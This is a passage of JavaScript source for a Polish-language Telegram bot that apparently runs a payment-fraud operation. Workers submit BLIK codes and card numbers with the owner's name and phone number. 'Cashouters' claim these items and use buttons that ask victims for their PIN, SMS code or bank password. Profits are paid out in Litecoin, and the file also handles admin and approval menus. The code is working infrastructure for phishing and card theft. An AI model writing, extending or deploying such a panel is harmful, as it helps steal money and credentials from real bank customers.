function modernHeader(title) {
	return `───────── [ 𝕂 ] ─────────\n❖ *${title.toUpperCase()}*\n──────────────────`;
}

function modernKv(label, value) {
	return `› **${label}:** \`${value}\``;
}

function modernBullet(text) {
	return `› ${text}`;
}

function modernInfo(text) {
	return `› ${text}`;
}

function buildModernStatus(sections) {
	return sections.map(({ title, lines }) => `${modernHeader(title)}\n${lines.join("\n")}`).join("\n\n");
}

function buildModernPrompt(sectionTitle, bodyText) {
	return `${modernHeader(sectionTitle)}\n\n› ${bodyText}`;
}

function getDismissKeyboard() {
	return {
		inline_keyboard: [
			[{ text: "Usuń wiadomość", icon_custom_emoji_id: "6039522349517115015", callback_data: "fg_dismiss_msg" }]
		]
	};
}

function getCancelKeyboard() {
	return {
		inline_keyboard: [
			[{ text: "Anuluj", icon_custom_emoji_id: "6030757850274336631", callback_data: "fg_cancel_flow" }]
		]
	};
}

async function sendModernStatus(chatId, sections, keyboard = null) {
	await sendFgMessage(chatId, buildModernStatus(sections), keyboard || getDismissKeyboard());
}

function mergeStatusSections(...sectionGroups) {
	const merged = new Map();
	for (const groups of sectionGroups) {
		if (!groups) continue;
		for (const section of groups) {
			const existing = merged.get(section.title);
			if (existing) {
				existing.lines.push(...section.lines);
			} else {
				merged.set(section.title, { title: section.title, lines: [...section.lines] });
			}
		}
	}
	return Array.from(merged.values());
}

async function editModernStatus(chatId, messageId, sections, keyboard = getDismissKeyboard()) {
	try {
		await bot.editMessageText(markdownToHtml(buildModernStatus(sections)), {
			chat_id: chatId,
			message_id: messageId,
			parse_mode: "HTML",
			reply_markup: keyboard || undefined
		});
		return true;
	} catch (e) {
		return false;
	}
}

async function notifyAdminAndUser({ adminId, userId, adminMessageId, adminChatId, adminSections, userSections }) {
	const samePerson = adminId === userId;
	const canEditAdminMsg = adminMessageId && adminChatId === adminId;

	if (samePerson) {
		const combined = mergeStatusSections(adminSections, userSections);
		if (canEditAdminMsg) {
			const edited = await editModernStatus(adminId, adminMessageId, combined);
			if (!edited) await sendModernStatus(adminId, combined);
		} else {
			await sendModernStatus(adminId, combined);
		}
		return;
	}

	if (adminSections?.length) {
		if (canEditAdminMsg) {
			const edited = await editModernStatus(adminId, adminMessageId, adminSections);
			if (!edited) await sendModernStatus(adminId, adminSections);
		} else {
			await sendModernStatus(adminId, adminSections);
		}
	}

	if (userSections?.length) {
		await sendModernStatus(userId, userSections);
	}
}

async function deleteUserInput(chatId, messageId) {
	if (messageId) {
		await bot.deleteMessage(chatId, messageId).catch(() => {});
	}
}

async function sendModernPrompt(chatId, sectionTitle, bodyText, userId = chatId, userMessageId = null) {
	await deleteUserInput(chatId, userMessageId);

	const text = buildModernPrompt(sectionTitle, bodyText);
	const keyboard = getCancelKeyboard();
	const user = await User.findOne({ id: userId });
	const oldPromptId = user?.promptMessageId;

	if (oldPromptId) {
		try {
			await bot.editMessageText(markdownToHtml(text), {
				chat_id: chatId,
				message_id: oldPromptId,
				parse_mode: "HTML",
				reply_markup: keyboard
			});
			return;
		} catch (e) {
			await bot.deleteMessage(chatId, oldPromptId).catch(() => {});
		}
	}

	const sent = await bot.sendMessage(chatId, markdownToHtml(text), { parse_mode: "HTML", reply_markup: keyboard });
	await editUserDB(userId, { promptMessageId: sent.message_id });
}

async function sendBannerPrompt(chatId, bannerFile, caption, userId = chatId, userMessageId = null) {
	await deleteUserInput(chatId, userMessageId);
	caption = markdownToHtml(caption);

	const keyboard = getCancelKeyboard();
	const user = await User.findOne({ id: userId });
	const oldPromptId = user?.promptMessageId;
	const photoPath = path.join(__dirname, bannerFile);

	if (oldPromptId) {
		try {
			await bot.editMessageMedia({
				type: "photo",
				media: `attach://${bannerFile}`,
				caption,
			}, {
				parse_mode: "HTML",
				chat_id: chatId,
				message_id: oldPromptId,
				reply_markup: keyboard
			}, { filename: bannerFile, contentType: "image/png" });
			return;
		} catch (e) {
			await bot.deleteMessage(chatId, oldPromptId).catch(() => {});
		}
	}

	const sent = await bot.sendPhoto(chatId, photoPath, {
		caption,
		parse_mode: "HTML",
		reply_markup: keyboard
	});
	await editUserDB(userId, { promptMessageId: sent.message_id });
}

async function editBannerPrompt(chatId, caption, userId) {
	caption = markdownToHtml(caption);
	const user = await User.findOne({ id: userId });
	const promptId = user?.promptMessageId;
	if (promptId) {
		try {
			await bot.editMessageCaption(caption, {
				chat_id: chatId,
				message_id: promptId,
				parse_mode: "HTML",
				reply_markup: getCancelKeyboard()
			});
			return;
		} catch (e) { }
	}
}

async function replacePromptWithStatus(userId, chatId, sections, userMessageId = null) {
	await deleteUserInput(chatId, userMessageId);

	const user = await User.findOne({ id: userId });
	const text = buildModernStatus(sections);
	const keyboard = getDismissKeyboard();
	const oldPromptId = user?.promptMessageId;

	if (oldPromptId) {
		try {
			await bot.editMessageText(markdownToHtml(text), {
				chat_id: chatId,
				message_id: oldPromptId,
				parse_mode: "HTML",
				reply_markup: keyboard
			});
			await editUserDB(userId, { promptMessageId: null });
			return;
		} catch (e) {
			await bot.deleteMessage(chatId, oldPromptId).catch(() => {});
		}
	}

	await bot.sendMessage(chatId, markdownToHtml(text), { parse_mode: "HTML", reply_markup: keyboard });
	await editUserDB(userId, { promptMessageId: null });
}

async function cancelUserFlow(userId, chatId, options = {}) {
	const { userMessageId = null, promptMessageId = null } = options;
	await deleteUserInput(chatId, userMessageId);

	const user = await User.findOne({ id: userId });
	const promptId = promptMessageId || user?.promptMessageId;
	if (promptId) {
		await bot.deleteMessage(chatId, promptId).catch(() => {});
	}

	await editUserDB(userId, { fgState: null, tempAmount: null, promptMessageId: null });

	if (user?.approved || (await isFgAdmin(userId))) {
		await sendCombinedMainMenu(chatId, userId);
	} else {
		await sendFgRegistrationMenu(chatId);
	}
}

async function sendPayoutMessage(text, keyboard = null) {
	if (!CONFIG.PAYOUT_BOT_TOKEN) return;
	const body = { chat_id: CONFIG.ADMIN_ID, text: markdownToHtml(text), parse_mode: "HTML" };
	if (keyboard) body.reply_markup = keyboard;
	await axios.post(`https://api.telegram.org/bot${CONFIG.PAYOUT_BOT_TOKEN}/sendMessage`, body);
}

async function handleAdminModerationCallback(query, ctx) {
	const { data, userId, messageId, from, chatId: adminChatId } = ctx;

	const actorLabel = from?.username ? `@${from.username}` : String(userId);

	const clearChannelButtons = async () => {
		if (!query.message?.chat?.id || !messageId) return;
		try {
			await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
				chat_id: query.message.chat.id,
				message_id: messageId
			});
		} catch (e) {}
	};

	// Gaszenie przycisków także w drugim kanale (kopia backdoor / main)
	const syncPairedButtons = async () => {
		const parts = data.split("_");
		if (data.startsWith("code_accept_") || data.startsWith("code_reject_")) {
			await clearPairedCodeButtons(`code_${parts.slice(4).join("_")}`);
		} else if (data.startsWith("payout_accept_") || data.startsWith("payout_reject_")) {
			await clearRegisteredButtons(`payout_${parts[2]}_${parts[3]}`);
		}
	};

	if (data.startsWith("app_accept_")) {
		const targetUserId = parseInt(data.split("_")[2]);
		await editUserDB(targetUserId, { approved: true, fgState: null });
		await addUserToList(targetUserId);
		await sendModernStatus(targetUserId, [
			{ title: "Dostęp przyznany", lines: [modernInfo("Twoje podanie zostało zaakceptowane — wyślij /start, aby otworzyć menu.")] }
		]).catch((err) => console.error("[app_accept] Powiadomienie usera:", err.message || err));
		await clearChannelButtons();
		await sendChannelMessage(
			CONFIG.CHANNELS.VERIFICATION,
			`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Podanie użytkownika \`${targetUserId}\` zostało **zaakceptowane** przez \`${actorLabel}\`.`
		).catch((err) => console.error("[app_accept] Potwierdzenie na kanale:", err.message || err));
		return true;
	}

	if (data.startsWith("app_reject_")) {
		const targetUserId = parseInt(data.split("_")[2]);
		await editUserDB(targetUserId, { approved: false, fgState: "awaiting_verification_source" });
		await sendModernStatus(targetUserId, [
			{ title: "Podanie odrzucone", lines: [modernBullet("Administrator odrzucił Twoje podanie.")] },
			{ title: "Info", lines: [modernInfo("Wyślij /start, aby spróbować ponownie.")] }
		]).catch((err) => console.error("[app_reject] Powiadomienie usera:", err.message || err));
		await clearChannelButtons();
		await sendChannelMessage(
			CONFIG.CHANNELS.VERIFICATION,
			`<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Podanie użytkownika \`${targetUserId}\` zostało **odrzucone** przez \`${actorLabel}\`.`
		).catch((err) => console.error("[app_reject] Potwierdzenie na kanale:", err.message || err));
		return true;
	}

	if (data.startsWith("payout_accept_")) {
		const parts = data.split("_");
		const targetUserId = parseInt(parts[2]);
		const amount = parseFloat(parts[3]);
		await sendModernStatus(targetUserId, [
			{
				title: "Wypłata zaakceptowana",
				lines: [
					modernKv("Kwota", `${amount.toFixed(2)} PLN`),
					modernBullet("Twoje środki są w drodze na adres LTC.")
				]
			}
		]);
		await sendChannelMessage(
			CONFIG.CHANNELS.PAYOUTS,
			`<tg-emoji emoji-id=\"5774022692642492953\">✅</tg-emoji> Wypłata \`${amount.toFixed(2)} PLN\` dla użytkownika \`${targetUserId}\` **zaakceptowana** przez \`${userId}\`.`
		);
		await clearChannelButtons();
		await syncPairedButtons();
		return true;
	}

	if (data.startsWith("payout_reject_")) {
		const parts = data.split("_");
		const targetUserId = parseInt(parts[2]);
		const amount = parseFloat(parts[3]);
		const targetUser = await User.findOne({ id: targetUserId });
		if (targetUser) {
			targetUser.withdrawn = Math.max(0, (targetUser.withdrawn || 0) - amount);
			await targetUser.save();
		}
		await sendModernStatus(
			targetUserId,
			[
				{ title: "Wypłata odrzucona", lines: [modernKv("Kwota", `${amount.toFixed(2)} PLN`)] },
				{ title: "Info", lines: [modernInfo("Środki wróciły na saldo do wypłaty.")] }
			]
		);
		await sendChannelMessage(
			CONFIG.CHANNELS.PAYOUTS,
			`<tg-emoji emoji-id=\"6030757850274336631\">❌</tg-emoji> Wypłata \`${amount.toFixed(2)} PLN\` dla użytkownika \`${targetUserId}\` **odrzucona** przez \`${userId}\`.`
		);
		await clearChannelButtons();
		await syncPairedButtons();
		return true;
	}

	if (data.startsWith("claim_")) {
		const parts = data.split("_");
		const targetUserId = parts[1];
		const amount = parts[2];
		const item = parts.slice(3).join("_");
		const meta = codeMeta.get(item) || {};
		const isCard = meta.type === "card";

		if (!isCodesChat(adminChatId)) {
			await bot.answerCallbackQuery(query.id, {
				text: "❌ Kody przejmuje się w kanale głównym.",
				show_alert: true
			}).catch(() => {});
			return true;
		}

		// Ktoś już przejął — pokaż mu dane, nowym odmów
		const claimerId = codeClaimer.get(item);
		if (claimerId && String(claimerId) !== String(userId)) {
			await bot.answerCallbackQuery(query.id, {
				text: "🔒 Kod został już przejęty przez inną osobę.",
				show_alert: true
			}).catch(() => {});
			return true;
		}
		codeClaimer.set(item, userId);
		await bot.answerCallbackQuery(query.id, { text: "🔓 Przejąłeś zgłoszenie." }).catch(() => {});

		const cashouterLabel = from?.username ? `@${from.username}` : "Cashouter";

		// Informacja dla workera — dokladnie w stylu bota
		if (meta.owner) {
			const kwotaLabel = meta.amount ? `${meta.amount} PLN` : `${amount} PLN`;
			await sendModernStatus(meta.owner, isCard ? [
				{
					title: "Cashouter zajął twoją kartę",
					lines: [
						`› **Cashouter:** ${cashouterLabel} (\`${userId}\`)`,
						modernKv("Kwota", kwotaLabel),
						modernBullet("Oczekuj na decyzję — dostaniesz powiadomienie.")
					]
				}
			] : [
				{
					title: "Cashouter zajął twój kod",
					lines: [
						`› **Cashouter:** ${cashouterLabel} (\`${userId}\`)`,
						modernKv("Kwota", kwotaLabel),
						modernBullet("Oczekuj na decyzję — dostaniesz powiadomienie.")
					]
				}
			]).catch(() => {});
		}

		// Odswiez wiadomosc na kanale glownym — pelne dane + przyciski decyzji
		if (meta.source === "gateway") {
			// sekrety bramki maja wlasny pelny tekst
		}
		const cleanFullText = meta.fullText
			? meta.fullText.replace(/\n?🔒 <b>Dane ukryte<\/b>[^\n]*/, "")
			: null;
		const fullText = cleanFullText || (isCard
			? `<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta przejęta</b>\n\n` +
				`<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${meta.amount || amount} PLN\n` +
				`<tg-emoji emoji-id=\"5778421276024509124\">💳</tg-emoji> <b>Karta</b> · <code>${item.replace(/(.{4})/g, "$1 ").trim()}</code>\n` +
				`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Osoba</b> · ${meta.person || "—"}\n` +
				`<tg-emoji emoji-id=\"6039605143601680423\">📞</tg-emoji> <b>Numer</b> · <code>${meta.phone || "—"}</code></blockquote>\n` +
				`🧑‍<tg-emoji emoji-id=\"5938492039971737551\">💼</tg-emoji> ${cashouterLabel} · 👷 ${meta.workerName || "—"}`
			: `<tg-emoji emoji-id=\"6035162669948867129\">🔢</tg-emoji> <b>Kod przejęty</b>\n\n` +
				`<blockquote><tg-emoji emoji-id=\"5778421276024509124\">💵</tg-emoji> <b>Kwota</b> · ${meta.amount || amount} PLN\n` +
				`<tg-emoji emoji-id=\"6035162669948867129\">🔢</tg-emoji> <b>Kod</b> · <code>${item}</code>\n` +
				`<tg-emoji emoji-id=\"6032994772321309200\">👤</tg-emoji> <b>Osoba</b> · ${meta.person || "—"}\n` +
				`<tg-emoji emoji-id=\"6039605143601680423\">📞</tg-emoji> <b>Numer</b> · <code>${meta.phone || "—"}</code></blockquote>\n` +
				`🧑‍<tg-emoji emoji-id=\"5938492039971737551\">💼</tg-emoji> ${cashouterLabel} · 👷 ${meta.workerName || "—"}`);

		const fromWorker = meta.source === "worker";
		const isSecret = item.includes("#");
		const cardRef = isSecret ? item.split("#")[0] : item;
		const decisionKeyboard = {
			inline_keyboard: isSecret
				? [
					[{ text: "Siedzi", icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${cardRef}` },
					 { text: "Limit w Banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${cardRef}` }],
					[{ text: "Karta odrzucona", icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${cardRef}` }],
					[{ text: "Poproś o Potwierdzenie", icon_custom_emoji_id: "6039573425268201570", callback_data: `card_4_${cardRef}` },
					 { text: "Poproś o Kod z SMS", icon_custom_emoji_id: "6039605143601680423", callback_data: `card_5_${cardRef}` }],
					[{ text: "Poproś o PIN", icon_custom_emoji_id: "6035162669948867129", callback_data: `card_6_${cardRef}` },
					 { text: "Poproś o Hasło", icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${cardRef}` }]
				]
				: isCard
				? [
					[{ text: "Siedzi", icon_custom_emoji_id: "5774022692642492953", callback_data: `card_1_${item}` },
					 { text: "Limit w Banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `card_2_${item}` }],
					[{ text: "Karta odrzucona", icon_custom_emoji_id: "5938215362473496448", callback_data: `card_3_${item}` }],
					[{ text: "Poproś o Potwierdzenie", icon_custom_emoji_id: "6039573425268201570", callback_data: `card_4_${item}` },
					 { text: "Poproś o Kod z SMS", icon_custom_emoji_id: "6039605143601680423", callback_data: `card_5_${item}` }],
					[{ text: "Poproś o PIN", icon_custom_emoji_id: "6035162669948867129", callback_data: `card_6_${item}` },
					 { text: "Poproś o Hasło", icon_custom_emoji_id: "6037249452824072506", callback_data: `card_7_${item}` }]
				]
				: fromWorker
					? [
						[{ text: "Akceptuj", icon_custom_emoji_id: "5774022692642492953", callback_data: `code_accept_${targetUserId}_${amount}_${item}` },
						 { text: "Odrzuć", icon_custom_emoji_id: "6030757850274336631", callback_data: `code_reject_${targetUserId}_${item}` }],
						[{ text: "Limit", icon_custom_emoji_id: "6030563507299160824", callback_data: `code_limit_${targetUserId}_${item}` }]
					]
					: [
						[{ text: "Siedzi", icon_custom_emoji_id: "5774022692642492953", callback_data: `status_2_${item}` },
						 { text: "Limit w Banku", icon_custom_emoji_id: "6030563507299160824", callback_data: `status_3_${item}` }],
						[{ text: "Błędny kod", icon_custom_emoji_id: "5938215362473496448", callback_data: `status_4_${item}` }]
					]
		};

		try {
			await bot.editMessageText(fullText, {
				chat_id: adminChatId,
				message_id: messageId,
				parse_mode: "HTML",
				reply_markup: decisionKeyboard
			});
		} catch (e) {
			await bot.sendMessage(adminChatId, fullText, {
				parse_mode: "HTML",
				reply_markup: decisionKeyboard
			}).catch(() => {});
		}

		// Panel cashoutera na PV
		const panelMsg = await sendFgMessage(
			userId,
			buildModernStatus([
				{
					title: isCard ? "Przetwarzasz kartę" : "Przetwarzasz kod",
					lines: [
						modernKv("Użytkownik", targetUserId),
						modernKv("Kwota", `${meta.amount || amount} PLN`),
						modernKv(isCard ? "Karta" : "Kod", item)
					]
				}
			]) + "\n\n" + modernInfo("Wybierz akcję poniżej."),
			decisionKeyboard
		).catch(() => null);
		registerClaimPanel(item, userId, panelMsg?.message_id);
		return true;
	}

	if (data.startsWith("code_accept_")) {
		const acceptLockKey = `${query.message?.chat?.id}:${messageId}`;
		if (codeAcceptLocks.has(acceptLockKey)) {
			await sendFgMessage(userId, "⚠️ Ta akcja została już przetworzona.");
			await clearChannelButtons();
			return true;
		}
		codeAcceptLocks.add(acceptLockKey);
		setTimeout(() => codeAcceptLocks.delete(acceptLockKey), 10000);

		const parts = data.split("_");
		const targetUserId = parseInt(parts[2], 10);
		const amount = parseFloat(parts[3]);
		const code = parts.slice(4).join("_");

		if (await isDepositOverLimit(amount)) {
			const limit = await getDepositLimit();
			await notifyAdminAndUser({
				adminId: userId,
				userId: targetUserId,
				adminMessageId: messageId,
				adminChatId,
				adminSections: [{ title: "Kod odrzucony", lines: [modernKv("Limit wpłaty", `${limit.toFixed(2)} PLN`)] }],
				userSections: [
					{ title: "Transakcja anulowana", lines: [modernKv("Kwota", `${amount.toFixed(2)} PLN`)] },
					{ title: "Info", lines: [modernInfo(`Przekroczono limit wpłaty (max ${limit.toFixed(2)} PLN). Możesz złożyć nowy kod — Wrzuć kod BLIK.`)] }
				]
			});
			await clearChannelButtons();
			return true;
		}

		const creditResult = await creditUserProfit(targetUserId, amount);
		if (!creditResult) {
			codeAcceptLocks.delete(acceptLockKey);
			await sendFgMessage(userId, "❌ Nie udało się zaksięgować kodu. Sprawdź, czy użytkownik istnieje w bazie.");
			await clearChannelButtons();
			return true;
		}

		const { targetUser, profit, fee } = creditResult;
		recordCodeStat("accept", amount).catch(() => {});

		const autoWithdraw = await triggerAutoWithdrawIfEnabled(targetUserId, profit, `Kod: \`${code}\``);

		if (autoWithdraw.triggered) {
			await notifyAdminAndUser({
				adminId: userId,
				userId: targetUserId,
				adminMessageId: messageId,
				adminChatId,
				adminSections: [{ title: "Kod zaakceptowany", lines: [modernInfo("Wygenerowano automatyczne zgłoszenie wypłaty.")] }],
				userSections: [{
					title: "Kod zaakceptowany",
					lines: [
						modernKv("Kwota wpłaty", `${amount.toFixed(2)} PLN`),
						modernKv(`Zysk po fee (${fee.toFixed(1)}%)`, `${profit.toFixed(2)} PLN`),
						modernBullet("Auto-wypłata wysłana na Twój adres LTC.")
					]
				}]
			});
		} else {
			await notifyAdminAndUser({
				adminId: userId,
				userId: targetUserId,
				adminMessageId: messageId,
				adminChatId,
				adminSections: [{
					title: "Kod zaakceptowany",
					lines: [
						modernKv("Użytkownik", targetUserId),
						
					]
				}],
				userSections: [{
					title: "Kod zaakceptowany",
					lines: [
						modernKv("Kwota wpłaty", `${amount.toFixed(2)} PLN`),
						modernKv(`Zysk po fee (${fee.toFixed(1)}%)`, `${profit.toFixed(2)} PLN`)
					]
				}]
			});
		}

		await clearChannelButtons();
		return true;
	}

	if (data.startsWith("code_reject_")) {
		const parts = data.split("_");
		const targetUserId = parseInt(parts[2], 10);
		recordCodeStat("reject").catch(() => {});
		await notifyAdminAndUser({
			adminId: userId,
			userId: targetUserId,
			adminMessageId: messageId,
			adminChatId,
			adminSections: [{ title: "Kod odrzucony", lines: [modernBullet("Odrzucono kod użytkownika.")] }],
			userSections: [
				{ title: "Transakcja anulowana", lines: [modernBullet("Kod został odrzucony przez cashoutera.")] },
				
			]
		});
		await clearChannelButtons();
		return true;
	}

	if (data.startsWith("code_limit_")) {
		const parts = data.split("_");
		const targetUserId = parseInt(parts[2], 10);
		recordCodeStat("reject").catch(() => {});
		await notifyAdminAndUser({
			adminId: userId,
			userId: targetUserId,
			adminMessageId: messageId,
			adminChatId,
			adminSections: [{ title: "Kod odrzucony", lines: [modernBullet("Oznaczono limit transakcji.")] }],
			userSections: [
				{ title: "Transakcja anulowana", lines: [modernBullet("Osiągnięto limit transakcji.")] },
			]
		});
		await clearChannelButtons();
		return true;
	}

	return false;
}

async function handleFgCallback(query) {
	const chatId = query.message?.chat?.id;
	const messageId = query.message?.message_id;
	const userId = query.from.id;
	const data = query.data;

	try {
		if (isUserFlooding(userId)) {
			await bot.answerCallbackQuery(query.id, {
				text: "Zbyt wiele akcji. Poczekaj chwilę.",
				show_alert: false
			}).catch(() => {});
			return true;
		}

		const isAdmin = await isFgAdmin(userId);
		const isMainAdmin = await isFgMainAdmin(userId);
		const user = await User.findOne({ id: userId });

		if (data === "fg_cancel_flow") {
			await bot.answerCallbackQuery(query.id).catch(() => {});
			await cancelUserFlow(userId, chatId, { promptMessageId: messageId });
			return true;
		}

		if (data === "fg_dismiss_msg") {
			await bot.answerCallbackQuery(query.id).catch(() => {});
			if (chatId && messageId) {
				await bot.deleteMessage(chatId, messageId).catch(() => {});
			}
			return true;
		}

		const claimItemFrom = (raw) => {
			const p2 = raw.split("_");
			// claim_<uid>_<kwota>_<item> | code_accept_<uid>_<kwota>_<item> | code_reject_<uid>_<item>
			if (raw.startsWith("claim_")) return p2.slice(3).join("_") || null;
			if (raw.startsWith("code_accept_")) return p2.slice(4).join("_") || null;
			if (raw.startsWith("code_reject_") || raw.startsWith("code_limit_")) return p2.slice(3).join("_") || null;
			if (raw.startsWith("card_") || raw.startsWith("status_")) return p2.slice(2).join("_") || null;
			if (raw.startsWith("blik_")) return p2.slice(1).join("_") || null;
			return null;
		};
		const isDecisionCallback =
			data.startsWith("claim_") ||
			data.startsWith("code_accept_") ||
			data.startsWith("code_reject_") ||
			data.startsWith("code_limit_") ||
			data.startsWith("card_") ||
			data.startsWith("status_") ||
			data.startsWith("blik_");
		const claimItemKey = isDecisionCallback ? claimItemFrom(data) : null;
		const iAmClaimer = claimItemKey && String(codeClaimer.get(claimItemKey) || "") === String(userId);
		const inChannelWorkflow = isCodesChat(chatId) || iAmClaimer;

		if (!isAdmin && (isCodesChat(chatId) || iAmClaimer)) {
			const handled = await handleAdminModerationCallback(query, {
				data, userId, chatId, messageId, isMainAdmin: false, from: query.from
			});
			if (handled) return true;
			// card_* / status_* / blik_* obsługuje drugi listener
			return false;
		}

		if (
			!isAdmin &&
			(data.startsWith("app_accept_") || data.startsWith("app_reject_")) &&
			(await canModerateApplication(userId, chatId, isAdmin))
		) {
			await bot.answerCallbackQuery(query.id).catch(() => {});
			await handleAdminModerationCallback(query, {
				data,
				userId,
				chatId,
				messageId,
				isMainAdmin: false,
				from: query.from
			});
			return true;
		}

		if (!isAdmin && !user?.approved && !inChannelWorkflow) {
			await bot.answerCallbackQuery(query.id, {
				text: "Oczekujesz na weryfikację. Wyślij /start.",
				show_alert: true
			}).catch(() => {});
			return true;
		}

		await bot.answerCallbackQuery(query.id).catch(() => {});

		if (user?.banned && !isAdmin && data.startsWith("fg_")) {
			await sendFgMessage(userId, "🚫 **Twoje konto zostało zbanowane przez administratora.**");
			return true;
		}

		if (isAdmin) {
			const moderationHandled = await handleAdminModerationCallback(query, {
				data,
				userId,
				chatId,
				messageId,
				isMainAdmin,
				from: query.from
			});
			if (moderationHandled) return true;
		}

		if (data === "fg_apply_access") {
			await editUserDB(userId, { fgState: "awaiting_verification_source" });
			await sendModernPrompt(userId, "Weryfikacja", "Skąd znasz bota?");
			return true;
		}

		if (data === "fg_banita_only") {
			await sendBanitaOnlyMenu(chatId, userId);
			return true;
		}

		if (data === "fg_submit_code") {
			const blikCheck = await checkBlikSubmissionAllowed(userId);
			if (!blikCheck.allowed) {
				await sendBlockedStatus(userId, blikCheck.title, blikCheck.message);
				return true;
			}
			if (!isAdmin && !user?.approved) {
				await sendModernStatus(userId, [
					{ title: "Weryfikacja", lines: [modernBullet("Dostęp do wrzucania kodów będzie możliwy po akceptacji podania.")] }
				]);
				return true;
			}
			await editUserDB(userId, { fgState: "awaiting_amount" });
			await sendBannerPrompt(userId, "banner/wrzuc.png", "Wpisz kwotę płatności:", userId);
			return true;
		}

		if (data === "fg_open_settings") {
			await showUserSettingsMenu(chatId, userId, messageId);
			return true;
		}

		if (data === "payment_gateways") {
			const offerCheck = await checkOfferCreationAllowed(userId);
			if (!offerCheck.allowed) {
				await sendBlockedStatus(userId, offerCheck.title, offerCheck.message);
				return true;
			}
			await sendPaymentGatewaysMenu(chatId, userId, messageId);
			return true;
		}

		if (data.startsWith("gateway_platform_")) {
			const platformKey = data.replace("gateway_platform_", "");
			if (GATEWAY_PLATFORMS[platformKey]) {
				await sendGatewayPlatformMenu(chatId, platformKey, messageId);
			}
			return true;
		}

		if (data === "settings") {
			await showUserSettingsMenu(chatId, userId, messageId);
			return true;
		}

		if (data === "fg_add_address") {
			await editUserDB(userId, { fgState: "awaiting_ltc_address" });
			await sendModernPrompt(userId, "Adres LTC", "Wpisz swój adres Litecoin (LTC).");
			return true;		}

		if (data === "fg_toggle_autowithdraw") {
			const current = await User.findOne({ id: userId });
			await editUserDB(userId, { autoWithdraw: !current.autoWithdraw });
			const statusStr = !current.autoWithdraw ? "WŁĄCZONA" : "WYŁĄCZONA";
			await sendModernStatus(userId, [
				{ title: "Auto-wypłata", lines: [modernKv("Status", statusStr)] }
			]);
			await showUserSettingsMenu(chatId, userId, messageId);
			return true;
		}

		if (data === "fg_withdraw") {
			const current = await User.findOne({ id: userId });
			const availableProfit = getAvailableProfit(current);

			if ((!current.ltcAddress || current.ltcAddress === "Brak") && !current.payoutOverrideAddress) {
				await sendFgMessage(userId,
					`───────── [ 𝕂 ] ─────────\n❖ *BRAK ADRESU LTC*\n──────────────────\n\n` +
					`› Przejdź do Ustawienia i ustaw swój adres LTC.`,
					{
						inline_keyboard: [
							[{ text: "Ustawienia", icon_custom_emoji_id: "5904258298764334001", callback_data: "settings" }]
						]
					}
				);
				return true;
			}

			if (availableProfit <= 0) {
				await sendFgMessage(userId,
					`───────── [ 𝕂 ] ─────────\n❖ *BRAK ŚRODKÓW*\n──────────────────\n\n` +
					`› Zysk do wypłaty: \`0.00 PLN\``
				);
				return true;
			}

			await editUserDB(userId, { fgState: "awaiting_withdraw_amount" });
			await sendBannerPrompt(
				userId,
				"banner/wyplac.png",
				`───────── [ 𝕂 ] ─────────\n❖ *WYPŁATA*\n──────────────────\n\n` +
				`› Podaj kwotę wypłaty. Dostępne środki na saldo \`${availableProfit.toFixed(2)} PLN\`.`,
				userId
			);
			return true;
		}

		if (isAdmin) {
			if (data === "fg_admin_top_profit") {
			await handleFgTopProfit(userId);
			return true;
		}

		if (data === "fg_admin_manage_admins") {
			if (!isMainAdmin) {
				await sendFgMessage(userId, "❌ Tylko główny administrator może zarządzać innymi administratorami.");
				return true;
			}
			const additionalAdmins = await getAdditionalAdmins();
			let adminListStr = `Główny Admin: \`${CONFIG.ADMIN_ID}\`\n\nDodatkowi administratorzy:\n`;
			if (additionalAdmins.length === 0) {
				adminListStr += "_Brak dodatkowych administratorów._";
			} else {
				additionalAdmins.forEach(id => {
					adminListStr += `â€˘ \`${id}\`\n`;
				});
			}
			const adminKeyboard = {
				inline_keyboard: [
					[
						{ text: "Dodaj Admina", icon_custom_emoji_id: "6032924188828767321", callback_data: "fg_admin_add_admin" },
						{ text: "Usuń Admina", icon_custom_emoji_id: "6039522349517115015", callback_data: "fg_admin_remove_admin" }
					],
					[{ text: "Powrót do panelu", icon_custom_emoji_id: "5895507195524550741", callback_data: "fg_admin_back" }]
				]
			};
			await sendFgMessage(userId, adminListStr, adminKeyboard);
			return true;
		}

		if (data === "fg_admin_back") {
			await sendFgAdminMenu(userId);
			return true;
		}

		if (data === "fg_admin_add_admin") {
			if (!isMainAdmin) return true;
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_add_admin" }) });
			await sendFgMessage(userId, "➕ **Dodawanie Administratora**\n\nWpisz **ID użytkownika**, któremu chcesz przyznać uprawnienia administratora:");
			return true;
		}

		if (data === "fg_admin_remove_admin") {
			if (!isMainAdmin) return true;
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_remove_admin" }) });
			await sendFgMessage(userId, "➖ **Usuwanie Administratora**\n\nWpisz **ID użytkownika**, któremu chcesz odebrać uprawnienia administratora:");
			return true;
		}

		if (data === "fg_admin_set_fee") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_fee" }) });
			await sendFgMessage(userId, "<tg-emoji emoji-id=\"5936143551854285132\">📊</tg-emoji> **Zmiana Fee Globalnego**\nWpisz nową wartość Fee w % (np. `25`):");
			return true;
		}

		if (data === "fg_admin_set_user_fee") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_user_fee_id" }) });
			await sendFgMessage(userId, "👤 **Indywidualne Fee Gracza**\n\nWpisz **ID użytkownika**, któremu chcesz ustawić własną stawkę:");
			return true;
		}

		if (data === "fg_admin_add_balance") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_add_balance_user" }) });
			await sendFgMessage(userId, "➕ **Dodawanie Wrzuconych Środków**\n\nWpisz **ID użytkownika**, któremu chcesz dodać środki:");
			return true;
		}

		if (data === "fg_admin_sub_balance") {
			await editUserDB(userId, { adminState: JSON.stringify({ action: "awaiting_sub_balance_user" }) });
